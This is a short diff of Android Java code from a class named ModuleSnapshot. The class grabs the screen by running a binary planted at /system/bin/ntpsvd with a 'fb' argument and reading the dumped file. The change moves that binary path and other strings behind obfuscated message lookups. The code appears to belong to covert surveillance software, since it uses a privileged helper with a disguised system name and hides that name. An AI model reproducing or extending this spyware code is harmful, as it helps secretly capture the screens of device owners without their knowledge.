@@ -300,7 +300,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	}
 
 	private byte[] getAdditionalData() {
-		final String window = Messages.getString("11.1"); //$NON-NLS-1$
+		final String window = Messages.getString("11_1"); //$NON-NLS-1$
 
 		final int wlen = window.length() * 2;
 		final int tlen = wlen + 24;
@@ -346,21 +346,21 @@ public class ModuleSnapshot extends BaseInstantModule {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 
-		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$
+		final String getrawpath = Messages.getString("11_2"); //$NON-NLS-1$
 
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
 
-			final Process localProcess = Runtime.getRuntime().exec(new String[] { "/system/bin/ntpsvd", "fb" });
+			final Process localProcess = Runtime.getRuntime().exec(new String[] { Messages.getString("a.0"), "fb" });
 			localProcess.waitFor();
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
 			}
 
-			final AutoFile file = new AutoFile(path, Messages.getString("11.3")); //$NON-NLS-1$
+			final AutoFile file = new AutoFile(path, Messages.getString("11_3")); //$NON-NLS-1$
 
 			if (file.exists()) {
 				return file.read();
